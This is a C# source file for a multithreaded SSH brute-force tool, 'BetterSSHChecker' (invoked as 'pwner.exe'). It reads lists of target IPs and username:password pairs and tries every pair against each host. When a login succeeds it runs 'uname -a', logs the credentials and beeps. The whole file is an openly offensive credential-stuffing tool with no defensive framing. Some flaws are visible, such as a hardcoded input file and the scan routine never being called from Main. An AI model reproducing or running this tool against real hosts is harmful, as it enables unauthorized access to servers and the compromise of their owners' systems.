using Renci.SshNet;
using Renci.SshNet.Messages.Connection;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BetterSSHChecker
{
    class Program
    {
        static void Main(string[] args)
        {
            
            /*  
             * pwner.exe --source:result.txt --userpass:userpass.txt -t 10 -T 10
             * 
             * 
             */

            string ips_source = "", userpass_source = "";
            int timeout = 1, threads = 1;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i].Contains("source"))
                {
                    ips_source = args[i].Split(":")[1];
                }
                if (args[i].Contains("userpass"))
                {
                    userpass_source = args[i].Split(":")[1];
                }
                if (args[i].Contains("-t"))
                {
                    timeout = int.Parse(args[i+1]);
                }
                if (args[i].Contains("-T"))
                {
                    threads = int.Parse(args[i+1]);
                }
            }

            Pwner Lord = new Pwner("dumb.txt", userpass_source, 1000, 10);
            
            Console.WriteLine("Done");
            Console.ReadKey();

        }


    }

    /// <summary>
    /// Pwner Class
    /// </summary>
    class Pwner
    {

        private HashSet<string> IPS = new HashSet<string>();
        private HashSet<Credentials> credentials = new HashSet<Credentials>();

        int timeout;
        int threads;

        bool isUp = false;
        int runningThread   = 0;
        int total_attemps   = 0;
        int testedAttemps   = 0;

        int maxTimeoutCount = 5;

        /// <summary>
        /// Contening an string username and string password.
        /// </summary>
        struct Credentials
        {
            public string username;
            public string password;

            /// <param name="username">The <see cref="string"/> instance that represents the username</param>
            /// <param name="password">The <see cref="string"/> instance that represents the password.</param>
            public Credentials(string username, string password)
            {
                this.username = username;
                this.password = password;
            }
        }

        /// <summary>
        /// Contening an Exception Exception and string Uname.
        /// </summary>
        public class SshResponse
        {
            public Exception Exception;
            public string uname;

        }

        /// <summary>
        /// Pwner Constructor, import given files, and execute the prelude.
        /// </summary>
        /// <param name="target_file">The <see cref="string"/> instance that represents the location of the IP file.</param>
        /// <param name="credentials_file">The <see cref="string"/> instance that represents the location of the credentials file.</param>
        /// <param name="timeout">The <see cref="int"/> instance that represents the time in milliseconds before cancellation.</param>
        /// <param name="threads">The <see cref="int"/> instance that represents the numbers of threads.</param>
        public Pwner(string target_file, string credentials_file, int timeout, int threads)
        {
            this.timeout = timeout;
            this.threads = threads;
            import(target_file, credentials_file);
            Prelude();

        }


        /// <summary>
        /// Import given IP and credentials file to feed the class's lists.
        /// </summary>
        /// <param name="target_file">The <see cref="string"/> instance that represents the location of the IP file.</param>
        /// <param name="credentials_file">The <see cref="string"/> instance that represents the location of the credentials file.</param>
        public void import(string target_file, string credentials_file)
        {

            Stopwatch w = new Stopwatch();
            logIt("Importing...");

            w.Start();
                getData<string>(target_file, IPS);
                getData<Credentials>(credentials_file, credentials);
            w.Stop();

            total_attemps = IPS.Count * credentials.Count;

            logIt($"Importated {IPS.Count + credentials.Count} lines in: {w.ElapsedMilliseconds}ms");

        }


        /// <summary>
        /// Shows begining message.
        /// </summary>
        public void Prelude()
        {
            logIt($"Looking for {IPS.Count}*{credentials.Count}:{total_attemps} attempts.");
        }

        /// <summary>
        /// Split toExplode into explodeNumber of HashSet.
        /// </summary>
        /// <param name="toExplode">The <see cref="HashSet"/> instance that initial HashSet to split.</param>
        /// <param name="explodeNumber">The <see cref="int"/> instance that represents the number of HashSet in the return list.</param>
        /// <returns>An instance of the <see cref="List"/> class contening explodedNumber of toExplode's splitted string.</returns>
        public List<HashSet<string>> splitHashSet(HashSet<string> toExplode, int explodeNumber)
        {

            List<HashSet<string>> explodedResult = new List<HashSet<string>>();
            
            HashSet<string> tmp = new HashSet<string>();

            explodeNumber = IPS.Count / explodeNumber;
            Console.WriteLine(explodeNumber);
            int i = 0;
            foreach (string line in toExplode)
            {

                tmp.Add(line);
                i++;

                if (i == explodeNumber)
                {
                    explodedResult.Add(tmp);
                    tmp = new HashSet<string>();
                    i = 0;
                }


            }

            // If there is any ips left, add them to the last set
            if (IPS.Count % explodeNumber > 0)
            {
                explodedResult[explodedResult.Count-1].UnionWith(tmp);
            }

            tmp = null;

            return explodedResult;

        }

        /// <summary>
        /// Start checking every IP from <see cref="IPS"/> divided in n/<see cref="threads"/> worker threads for every credentials.
        /// </summary>
        public void startCheck()
        {

            Stopwatch w = new Stopwatch();

            List<HashSet<string>> ThreadsWorkingSets = splitHashSet(IPS, threads);
            
            logIt($"{IPS.Count * credentials.Count} attemps / {threads}: {total_attemps / threads} per threads");

            w.Start();

            Task[] tasks = new Task[ThreadsWorkingSets.Count];

            foreach (HashSet<string> currentSet in ThreadsWorkingSets)
            {

                Task v = new Task(() => {
                        runningThread++;
                        while(!isUp)
                        {
                            System.Threading.Thread.Sleep(100);
                        }

                        int currentThread = (int)Task.CurrentId;

                        bool exitLoop;
                        bool tooManyTimeout;
                        int  timeoutCount;

                        foreach (string IP in currentSet)
                        {

                            timeoutCount = 0;
                            tooManyTimeout = false;
                            exitLoop     = false;

                            foreach (Credentials cred in credentials)
                            {
                                
                                SshResponse Response = meet(IP, cred.username, cred.password);
                                Interlocked.Increment(ref testedAttemps);

                                if (!(Response.Exception is null))
                                {

                                    switch (Response.Exception.GetType().ToString())
                                    {
                                        
                                        // Login timed out      -> continue
                                        case "Renci.SshNet.Common.SshOperationTimeoutException":
                                            timeoutCount++;
                                            if (timeoutCount == maxTimeoutCount) tooManyTimeout = true;

                                            logIt($"{IP} timed out! {timeoutCount}/{maxTimeoutCount}", currentThread, false);
                                            break;
                                    
                                        // Network error, is off -> break to next IP
                                        case "System.AggregateException":
                                            logIt($"{IP} is off!", currentThread, false);
                                            exitLoop = true;
                                            break;

                                        // Network error or connection refused -> break to next IP
                                        case "System.Net.Sockets.SocketException":
                                            logIt($"{IP} gone oopsy! \n::{Response.Exception.Message}", currentThread, false);
                                            exitLoop = true;
                                            break;

                                        // Bad authentification / others -> continue
                                        default:
                                            logIt($"{IP}@{cred.username}:{cred.password}", currentThread, false);
                                            break;

                                    }

                                    if (exitLoop || tooManyTimeout) break;
                                  
                                } else {
                                    logIt($"{IP}@{cred.username}:{cred.password} \n-> {Response.uname}", currentThread, true);
                                    Console.Beep();
                                    break;
                                }

                            }

                        }
                        
                       Interlocked.Decrement(ref runningThread);
                });

                v.Start();
                tasks[v.Id-1] = v;
            }

            
            // Wait Until all threads started
            while (!isUp)
            {
                Console.Write("\r[{0}] Starting Threads... {1}/{2}", DateTime.Now.ToString("hh:mm:ss"), runningThread, ThreadsWorkingSets.Count);

                if (runningThread == ThreadsWorkingSets.Count)
                {
                    isUp = true;
                    Console.WriteLine();
                }

                System.Threading.Thread.Sleep(100);
                
            }
            
            monitorMaster();
            
            Task.WaitAll(tasks);
            
            w.Stop();
            
            isUp = false;
            
            logIt($"Exec {w.ElapsedMilliseconds}ms");
            Console.WriteLine(testedAttemps);

        }


        /// <summary>
        /// Import source file into a HashSet of <typeparamref name="T"/> destination. 
        /// </summary>
        /// <param name="source">The <see cref="string"/> instance that represents the location of the source file.</param>
        /// <param name="destination">The <see cref="HashSet"/> instance that represents the destination of the imported source.</param>
        public void getData<T>(string source, HashSet<T> destination)
        {

            using (StreamReader sr = File.OpenText(source))
            {
                string[] splitted;
                string s = String.Empty;
                while ((s = sr.ReadLine()) != null)
                {
                    if (typeof(T) == typeof(Credentials))
                    {
                        try
                        {
                            splitted = s.Split(':');
                            destination.Add((T)(object)new Credentials(splitted[0], splitted[1]));
                        }
                        catch (Exception) { }

                    } else
                    {
                        destination.Add((T)(object)s);
                    }

                }
            }



        }


        /// <summary>
        /// Connect to an SSH.
        /// </summary>
        /// <param name="targetIP">The <see cref="string"/> instance that represents the target IP.</param>
        /// <param name="user">The <see cref="string"/> instance that represents the login.</param>
        /// <param name="pass">The <see cref="string"/> instance that represents the password.</param>
        /// <returns>An instance of the <see cref="SshResponse"/> class representing the result of the connection, an <see cref="Exception"/> if error; otherwise, an uname.</returns>
        SshResponse meet(string targetIP, string user, string pass)
        {

            SshResponse response = new SshResponse();
            try
            {

                using (var client = new SshClient(targetIP, user, pass))
                {
                    client.ConnectionInfo.Timeout = TimeSpan.FromMilliseconds(timeout);
                    client.Connect();

                    SshCommand runcommand = client.CreateCommand("uname -a");
                    runcommand.CommandTimeout = TimeSpan.FromMilliseconds(10000);
                    response.uname = runcommand.Execute(); ;

                    client.Disconnect();
                }

            }
            catch (Exception wank)
            {
                // System.Net.Sockets.SocketException
                // Renci.SshNet.Common.SshOperationTimeoutException
                // System.AggregateException 
                response.Exception = wank;
                //response.Exeception = new Exception();
            }

            return response;

            
        }

        /// <summary>
        /// Write a message to the console with "[Current Time] message" syntax.
        /// </summary>
        /// <param name="message">The <see cref="string"/> instance that represents the message to display</param>
        public void logIt(string message)
        {
            Console.WriteLine("[{0}] {1}", DateTime.Now.ToString("hh:mm:ss"), message);
        }

        /// <summary>
        /// Write a message to the console with "[Current Time] #Wich Thread (+/-) message" syntax.
        /// </summary>
        /// <param name="message">The <see cref="string"/> instance that represents the message to display/param>
        /// <param name="thread">The <see cref="int"/> instance that represents the caller's thread number./param>
        /// <param name="success">The <see cref="bool"/> instance that represents if success or not (+/-).</param>
        public void logIt(string message, int thread, bool success)
        {
            Console.WriteLine("[{0}]#T{1}({2}) {3}", DateTime.Now.ToString("hh:mm:ss"), thread, success ? "+" : "-", message);
        }
       
        /// <summary>
        /// Change console title to "{tested attemps/total} attemps r{number of attemps per second) r{number of attemps per minute}
        /// </summary>
        /// <param name="message">The <see cref="string"/> instance that represents the message to display/param>
        /// <param name="thread">The <see cref="int"/> instance that represents the caller's thread number./param>
        /// <param name="success">The <see cref="bool"/> instance that represents if success or not (+/-).</param>
        public void monitorMaster()
        {
            // Monitor rates
            new Task(() =>
            {
                int last_tested = 0;
                int minute_count = 0;
                int minute_tested = 0;
                int minute_rate = 0;

                while (isUp)
                {
                    Console.Title = String.Format("{0}/{1} r{2}/s r{3}/m", testedAttemps, total_attemps, testedAttemps - last_tested, minute_rate);
                    last_tested = testedAttemps;
                    System.Threading.Thread.Sleep(1000);

                    if (minute_count == 60)
                    {
                        minute_rate = testedAttemps - minute_tested;
                        minute_count = 0;
                        minute_tested = testedAttemps;

                    }
                    else
                    {
                        minute_count++;
                    }
                }
            }).Start();
        }

    }

}
